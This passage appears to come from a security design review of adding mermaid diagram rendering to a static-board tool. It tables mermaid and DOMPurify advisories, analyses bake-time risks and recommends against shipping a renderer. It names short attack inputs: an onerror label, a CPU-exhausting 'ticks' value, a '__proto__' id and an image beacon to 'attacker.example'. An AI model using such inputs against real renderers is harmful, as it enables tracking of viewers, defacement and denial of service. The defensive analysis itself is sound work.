A hostile ticket cannot flip `securityLevel`, because it is in the `secure` array along with
`startOnLoad`, `maxTextSize`, `suppressErrorRendering`, and `maxEdges`. It **can** set
`fontFamily`, `themeCSS`, `altFontFamily`, `themeVariables`, `htmlLabels`, and `dompurifyConfig`
via `%%{init:}%%`, which is the mechanism behind CVE-2026-41159 below.

`sandbox` is the workaround mermaid's security team names in five separate advisories, and it is
**incompatible with a self-contained bake**. `mermaidAPI.ts` appends an `<iframe sandbox="">`
(empty string, every restriction on) and `serializeSvg` wraps the output through `putIntoIFrame`,
which produces a base64 `data:` document inside a second iframe. In sandbox mode
`mermaid.render()` **does not return an SVG**, it returns an `<iframe>` element string, and there
is no DOMPurify pass on that path because the isolation is the mitigation. You cannot inline that
as SVG and you cannot post-process it as SVG.

### Advisories against mermaid, and how many fire on defaults

Sourced from [github.com/advisories](https://github.com/advisories?query=mermaid), the
[mermaid security advisories page](https://github.com/mermaid-js/mermaid/security/advisories), and
an OSV aggregate query, which returned 16 for mermaid.

Direct XSS from diagram text:

| GHSA | CVE | Affected | Fixed | Mechanism |
| --- | --- | --- | --- | --- |
| [GHSA-7rqq-prvp-x9jh](https://github.com/advisories/GHSA-7rqq-prvp-x9jh) | [CVE-2025-54881](https://nvd.nist.gov/vuln/detail/CVE-2025-54881) | 11.0.0-alpha.1 to 11.9.x, 10.9.0-rc.1 to 10.9.3 | 11.10.0 / 10.9.4 | Sequence participant label with KaTeX `$$` delimiters routes through `calculateMathMLDimensions`, which does `divElem.innerHTML = text` on unsanitized input. **Default config.** |
| [GHSA-8gwm-58g9-j8pw](https://github.com/advisories/GHSA-8gwm-58g9-j8pw) | [CVE-2025-54880](https://nvd.nist.gov/vuln/detail/CVE-2025-54880) | 11.1.0 to 11.9.x | 11.10.0 | `architecture-beta` service `iconText` passed to d3 `.html()` inside a `<foreignObject>`. **Default config.** Rated Critical on the repo advisory. |
| [GHSA-p3rp-vmj9-gv6v](https://github.com/advisories/GHSA-p3rp-vmj9-gv6v) | [CVE-2021-43861](https://nvd.nist.gov/vuln/detail/CVE-2021-43861) | <8.13.8 | 8.13.8 | Incorrect sanitization; "malicious diagrams can contain javascript code that can be run at diagram readers machines" |
| [GHSA-w32g-5hqp-gg6q](https://github.com/advisories/GHSA-w32g-5hqp-gg6q) | none | <8.2.3 | 8.2.3 | Node label `A["<img src=invalid onerror=...>"]` executed instead of encoded |

CSS and HTML injection escaping the SVG, no script needed:

| GHSA | CVE | Affected | Fixed | Mechanism |
| --- | --- | --- | --- | --- |
| [GHSA-ghcm-xqfw-q4vr](https://github.com/advisories/GHSA-ghcm-xqfw-q4vr) | CVE-2026-41149 | <=11.14.0, <=10.9.5 | 11.15.0 / 10.9.6 | State `classDef` breaks out of `</style></svg>` and injects a full-viewport overlay div. Total page defacement from a ticket body. |
| [GHSA-xcj9-5m2h-648r](https://github.com/advisories/GHSA-xcj9-5m2h-648r) | CVE-2026-41148 | <=11.14.0, <=10.9.5 | 11.15.0 / 10.9.6 | `classDef` value captured by `[^\n]*` flows unsanitized to `style.innerHTML`; enables defacement, `url()` tracking, and DOM-attribute exfiltration via `:has()` |
| [GHSA-87f9-hvmw-gh4p](https://github.com/advisories/GHSA-87f9-hvmw-gh4p) | CVE-2026-41159 | <=11.14.0, <=10.9.5 | 11.15.0 / 10.9.6 | `%%{init: {"fontFamily": ...}}%%` abuses stylis `&` handling; `:not(&)` escapes the `#mermaid-xxx` scope and at-rules get hoisted to top level |
| [GHSA-6x64-9x62-f2gx](https://github.com/advisories/GHSA-6x64-9x62-f2gx) | CVE-2026-50159 | <=11.16.0, <=10.9.7 | 11.16.1 / 10.9.8 | Sibling combinators escape the `#mermaid-X` prefix. **The advisory says most users are safe because mermaid makes the `<svg>` an only child, "you may be affected if you manually insert the `<svg>` into the DOM yourself."** That is exactly what a bake step does. |
| [GHSA-x3vm-38hw-55wf](https://github.com/advisories/GHSA-x3vm-38hw-55wf) | CVE-2022-31108 | 8.0.0 to 9.1.1 | 9.1.2 | `textColor` theme variable to arbitrary CSS; the advisory demonstrates character-by-character exfiltration of an input value via `background-image: url(...)` |

Denial of service, all reachable from a five-line diagram:

| GHSA | CVE | Affected | Fixed | Mechanism |
| --- | --- | --- | --- | --- |
| [GHSA-6m6c-36f7-fhxh](https://github.com/advisories/GHSA-6m6c-36f7-fhxh) | [CVE-2026-41150](https://nvd.nist.gov/vuln/detail/CVE-2026-41150) | <=11.14.0, <=10.9.5 | 11.15.0 / 10.9.6 | Gantt `excludes monday,...,sunday` to infinite loop. The advisory states `mermaid.parse` is unaffected; the hang is in `getTasks()` at render. |
| [GHSA-2v8p-3f2j-5mp7](https://github.com/advisories/GHSA-2v8p-3f2j-5mp7) | CVE-2026-71436 | 10.6.0 to 10.9.7, 11.x <=11.16.0 | 11.16.1 / 10.9.8 | `xychart` with `x-axis 1 --> 1` loops appending to an array until `RangeError` or OOM |
| [GHSA-rhh3-jpg6-66xh](https://github.com/advisories/GHSA-rhh3-jpg6-66xh) | CVE-2026-71439 | 11.6.0 to 11.16.0 | 11.16.1 | `radar-beta` with `ticks 1000000000` pegs CPU until OOM. **No workaround given.** |

Prototype pollution:

| GHSA | CVE | Affected | Fixed | Mechanism |
| --- | --- | --- | --- | --- |
| [GHSA-3rrr-jr9j-h3q3](https://github.com/advisories/GHSA-3rrr-jr9j-h3q3) | CVE-2026-71437 | 11.5.0 to 11.16.0 | 11.16.1 | `architecture-beta` group id of `__proto__` writes onto `Object.prototype`. Reachable from pure diagram text. |
| [GHSA-m4gq-x24j-jpmf](https://github.com/advisories/GHSA-m4gq-x24j-jpmf) | none | <10.9.3 | 10.9.3 | The **bundled-DOMPurify** problem: `dist/mermaid.min.js` and the other prebuilt bundles shipped a DOMPurify vulnerable to CVE-2024-45801. Consumers of `import mermaid from 'mermaid'` were not affected. |

That last one is directly aimed at this use case. Inlining `mermaid.min.js` into a baked board is
precisely the consumption mode that was vulnerable while the source-importing mode was not, because
the prebuilt bundle freezes its DOMPurify at build time.

**Nine of the sixteen advisories landed in 2026, four of them fixed in 11.16.1 within the last two
weeks.** More importantly, CVE-2025-54880, CVE-2025-54881, CVE-2026-41148, CVE-2026-41149,
CVE-2026-41159, CVE-2026-50159, and CVE-2026-71437 are all reachable **in the default `strict`
configuration from diagram text alone**. The repeat failure mode is not "someone misconfigured it."

The advisory database returns 55 results for "mermaid", most of them against embedders rather than
mermaid: Open WebUI ([GHSA-v8qj-hxv7-mgvv](https://github.com/advisories/GHSA-v8qj-hxv7-mgvv), CVE-2026-54011,
cause: `securityLevel: 'loose'`), OneUptime (CVE-2026-32308, same cause), Docmost
([GHSA-r4hj-mc62-jmwj](https://github.com/docmost/docmost/security/advisories/GHSA-r4hj-mc62-jmwj),
`mermaid.render()` output injected via `dangerouslySetInnerHTML`), SiYuan
([GHSA-w95v-4h65-j455](https://github.com/advisories/GHSA-w95v-4h65-j455), CVE-2026-40107,
"zero-click NTLM hash theft and blind SSRF via mermaid diagram rendering"), Excalidraw, JetBrains
YouTrack, GitLab, and
[jupyter/nbconvert](https://github.com/advisories/GHSA-9754-6rhw-gj3h) (CVE-2026-6658). nbconvert
is a bake-to-static-HTML tool, the closest analogue to scratchboard in the whole list.

### The SVG blob itself

DOMPurify's own `svgDisallowed` list in
[src/tags.ts](https://github.com/cure53/DOMPurify/blob/main/src/tags.ts) is the best primary answer
to "what can hide in an SVG", written by the people who maintain the sanitizer: `animate`,
`cursor`, `discard`, `font-face*`, **`foreignobject`**, `missing-glyph`, `script`, `set`,
`unknown`, `use`, and others. URL schemes are filtered by
[src/regexp.ts](https://github.com/cure53/DOMPurify/blob/main/src/regexp.ts), where
`IS_ALLOWED_URI` permits only `http(s)`, `ftp(s)`, `mailto`, `tel`, `callto`, `sms`, `cid`,
`xmpp`, `matrix` and relative forms, and `IS_SCRIPT_OR_DATA = /^(?:\w+script|data):/i` catches
`javascript:` including in `xlink:href`. DOMPurify's regression corpus at
[test/fixtures/expect.mjs](https://github.com/cure53/DOMPurify/blob/main/test/fixtures/expect.mjs)
is more useful than the
[OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html),
which carries only `<svg/onload=alert('XSS')>` and a base64 `<embed>` payload with no
`foreignObject`, `xlink:href`, or `<use>` coverage. Fourteen of DOMPurify's fixtures reference
`foreignObject`, `xlink:href`, or `attributeName`, and many combine `<svg>` with `<style>`, which
is where mXSS lives and exactly the boundary mermaid straddles.

Mermaid puts `foreignObject` back: `ADD_TAGS = ['foreignobject']` plus
`HTML_INTEGRATION_POINTS: { foreignobject: true }` in `mermaidAPI.ts`. The
`HTML_INTEGRATION_POINTS` flag is the mitigating half, telling DOMPurify to parse the subtree under
HTML rules. The net effect is still that mermaid's default output is an SVG containing arbitrary
sanitized HTML in the one element DOMPurify's authors chose to strip by default. `htmlLabels`
defaults to **true** (`config.ts`: `evaluate(config.htmlLabels ?? config.flowchart?.htmlLabels ??
true)`). Setting `htmlLabels: false` renders labels as plain SVG `<text>` runs and removes the
largest sink class, and CVE-2025-54880 is exactly a `foreignObject` bug. It does not remove the CSS
injection class. And `htmlLabels` is **not** in the `secure` array, so a hostile ticket can turn it
back on via `%%{init}%%` unless you add it.

DOMPurify is not a backstop you can lean on either. OSV lists **30 advisories** for
`npm/dompurify`, several of them full bypasses under default configuration, including
[GHSA-mmhx-hmjr-r674](https://github.com/cure53/DOMPurify/security/advisories/GHSA-mmhx-hmjr-r674)
/ [CVE-2024-45801](https://nvd.nist.gov/vuln/detail/CVE-2024-45801) (the one mermaid shipped),
[GHSA-v9jr-rg53-9pgp](https://github.com/advisories/GHSA-v9jr-rg53-9pgp) / CVE-2026-41238
(prototype-pollution gadget to XSS under default config, fixed 3.4.0), and
[GHSA-55q2-fjhq-7xh7](https://github.com/advisories/GHSA-55q2-fjhq-7xh7) / CVE-2026-75838 (fixed in
3.4.13, weeks ago). Mermaid declares `dompurify: ^3.3.3`, a caret, so a fresh install today
resolves to 3.4.14.

### Bake time

Three things make bake time worse than runtime, not better.

**There is no render timeout.** A grep of `packages/mermaid/src` for `setTimeout`, `timeout`,
`AbortController`, `deadline`, and `maxRenderTime` found only a `setTimeout(cb, 0)` scheduler
fallback and a microtask for image sizing. Mermaid ships no time budget, no abort signal, and no
work cap on rendering, against three shipped infinite-loop CVEs. The two size caps that exist are
`maxTextSize` (default 50000, and it **replaces the text with a message rather than throwing**, and
only in `render`, not `parse`) and `maxEdges` (default 500, enforced **only** in the flowchart DB;
no other diagram type has an equivalent). Neither bounds CPU: the `radar` `ticks 1000000000` payload
is well under 50 KB and has no edges. A `while(true)` in a ticket body is a failure that
`try/catch` cannot survive, so honouring the warnings rule here needs a process boundary and a wall
clock, not an exception handler.

**The `img:` shape is unsanitized.** The documented flowchart syntax
`A@{ img: "https://example.com/image.png", label: "...", pos: "t" }` reaches `flowDb.ts`, which
assigns `vertex.img = doc?.img` with **no `formatUrl` or `sanitizeUrl` call**, in contrast to
`setLink` a few hundred lines later. It ends up as `shapeSvg.append('image').attr('href', node.img)`,
and DOMPurify keeps it, because `image` is in the svg allowlist and `https:` passes
`IS_ALLOWED_URI`. Mermaid also has `labelImageUtils.ts`, which exists specifically to await each
`<img>`'s load event before measuring. So a ticket containing
`A@{ img: "https://attacker.example/beacon?id=x" }` produces an outbound request from the bake
machine, which mermaid **waits on**, and a surviving `<image href>` in the baked HTML that beacons
on every page load from every viewer, indefinitely. For a board baked from a stranger's repo and
published to Pages, that is a persistent tracker carrying your readers' IP addresses. It is the
same class as CVE-2026-40107, and on Windows a UNC-style reference is how that advisory's NTLM hash
theft half works. `board.js`'s `SAFE_HREF` never sees any of it, because mermaid produces
`<image href>` inside an SVG blob, not a markdown link.

Mermaid core makes no `fetch` calls of its own (grepped; the only hits are in the docs VitePress
build), and `architecture-beta` icons are bundled locally rather than fetched. The network risk is
entirely diagram-author-controlled through those image sinks. Under Puppeteer it is worse, because
a default Chromium honours `<image href>`, `<img src>`, `@font-face`, and CSS `url()` from the bake
machine's network position unless you configure request interception. mermaid-cli's source was not
read on this point, so what it sets by default is **unverified** and worth checking before
committing to that path.

## 8. Recommendation

Do not ship a runtime renderer. At 3,572,296 bytes, full mermaid makes every board 8.2 times its
current size; `@mermaid-js/tiny` makes it 5.8x; beautiful-mermaid makes it 3.7x and fetches a
Google font on every page load; and the hand-stripped flowchart-plus-sequence build that reaches
979,043 bytes (still 2.2x) requires stubbing content-hashed internal filenames that change every
release. There is no supported subset build and there has not been one for three and a half years.
Beyond size, inlining `mermaid.min.js` is the exact consumption mode GHSA-m4gq-x24j-jpmf singled
out, because a prebuilt bundle freezes its DOMPurify at build time and a baked board freezes it
forever.

Bake-time static SVG is the only shape that respects the payload contract, and it is technically
real: the svgdom path renders 10 of 12 diagram types at 28 ms each with no browser, producing SVG
with no `foreignObject`, no `<script>`, and no external URLs. But it needs jsdom, jsdom needs Node
22, and Node 18 is the floor. The path that keeps Node 18 is `@mermaid-js/mermaid-cli`, which means
Puppeteer, about 1 GB across two caches, and 23 seconds on a cold runner. Neither can be reached
through the `npx` escape hatch without changing what the tool is: the pattern is legitimate, since
no line lands in `package.json`, but a pinned top-level version does not pin `mermaid` itself
(measured: pinning mermaid-cli 11.15.0 resolved mermaid 11.17.0), `npx` is not offline by default
even with a warm cache, and Chromium lands outside the npm cache entirely.

So my recommendation is to keep the incumbent. `board.js` already renders a `` ```mermaid `` fence
as escaped `<pre><code>`. That costs zero bytes, cannot execute, cannot beacon, cannot hang the
bake, and shows the reader the diagram source, which for a dependency graph or a short sequence is
often enough. It is also the correct fallback for every other option, so it is worth naming as the
product answer rather than the absence of one.

If diagram rendering is wanted anyway, the shape the evidence supports is narrow: bake-time only,
opt-in behind an explicit config flag and off by default, `@mermaid-js/mermaid-cli` and `mermaid`
both pinned by a committed lockfile with integrity hashes rather than a version range, since
section 5 measured that an `npx` CLI pin does not reach transitive `mermaid` and its cache
lockfile is never committed, with the bake failing when a post-resolution audit finds a different
graph, run in a subprocess with a hard wall-clock kill, `suppressErrorRendering: true`
with the exception caught into `warnings` alongside the ticket path, `htmlLabels: false`, `secure`
extended to include `htmlLabels` and `dompurifyConfig`, `<image>` and `<img>` stripped or
allowlisted out of the output SVG by scratchboard's own code rather than mermaid's, the inlined
`<svg>` wrapped in an only-child `<div>` per GHSA-6x64-9x62-f2gx, and the fenced-code block as the
fallback whenever the renderer is absent, offline, or times out. That is seven permanent
obligations against a dependency that published four advisories in the last two weeks, and it is
the real trade against the zero-dependency rule. The rule is not the expensive part here. The
maintenance is.

A cheaper thing worth weighing separately: `@viz-js/viz@3.29.0` is a zero-dependency Graphviz wasm
build that inlines its own wasm, genuinely runs in Node with no browser, and needs no font metrics
because Graphviz uses compiled-in width tables. It is 479,573 gzipped, it is not mermaid syntax,
and it draws only DOT. If the underlying want is "draw the dependency graph" rather than "support
mermaid", that is a different and much smaller question, and section 5 of
[dag-layout.md](dag-layout.md) already argues the graph itself may not need drawing at all.

## What was not verified

- No actual mermaid parse-error message string was captured. The Jison and Langium shapes differ,
  and the `reason` field should not be promised a format until someone runs it.
- `diagram-api/detectType.js` was not read, so "cheap type detection without a full parse is safe
  on untrusted text" is unverified.
- The `xychart` and `radar` DoS advisories do not say whether they are `parse`-reachable or only
  `render`-reachable, unlike the gantt one, which explicitly exempts `parse`. Assume unknown.
- Whether mermaid-cli configures Puppeteer request interception, sandbox flags, or
  `protocolTimeout` by default. Its source was not read.
- KaTeX web fonts: mermaid depends on `katex@^0.16.47` and math rendering is on by default
  (`legacyMathML: false`), so whether a baked board would pull KaTeX fonts from a CDN depends on
  the stylesheet shipped. Not checked either way.
- svgdom layout quality on large or non-Latin diagrams. Twelve small ones were tested.
- `npm --strict-allow-scripts` exists in current libnpmexec and looks relevant to blocking the
  Chromium download under `npx`, but it was not exercised.
- Render times were measured on an M-series Mac with a warm page cache. CI runners will be slower.
